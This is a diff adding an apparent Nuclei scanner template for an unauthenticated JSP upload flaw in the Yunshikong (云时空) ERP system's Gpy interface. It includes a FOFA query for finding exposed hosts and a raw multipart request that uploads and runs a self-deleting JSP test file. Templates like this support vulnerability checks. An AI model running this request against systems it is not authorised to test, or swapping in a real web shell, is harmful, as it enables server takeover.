@@ -1,0 +1,37 @@
+id: yunshikong-erp-gpy-file-upload-rce
+
+info:
+  name: "云时空社会化商业ERP系统Gpy接口任意文件上传漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="云时空社会化商业ERP系统"
+      云时空社会化商业ERP系统是基于互联网架构的多渠道营销服务管理平台，集成线上线下的企业经营管理模块。该系统Gpy接口存在文件上传逻辑缺陷，攻击者可利用该漏洞在未认证状态下上传JSP文件，进而获取服务器控制权限。受影响文件存储路径为：http://ip/uploads/pics/返回的日期/上传的文件名
+  tags: 云时空社会化商业ERP系统
+
+http:
+- raw:
+  - |
+    POST /servlet/fileupload/gpy HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Connection: close
+    Upgrade-Insecure-Requests: 1
+    Content-Type: multipart/form-data; boundary=4eea98d02AEa93f60ea08dE3C18A1388
+
+    --4eea98d02AEa93f60ea08dE3C18A1388
+    Content-Disposition: form-data; name="file1"; filename="NTest.jsp"
+    Content-Type: application/octet-stream
+
+    <% out.println("NdayTest"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+    --4eea98d02AEa93f60ea08dE3C18A1388--
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'jspdate'
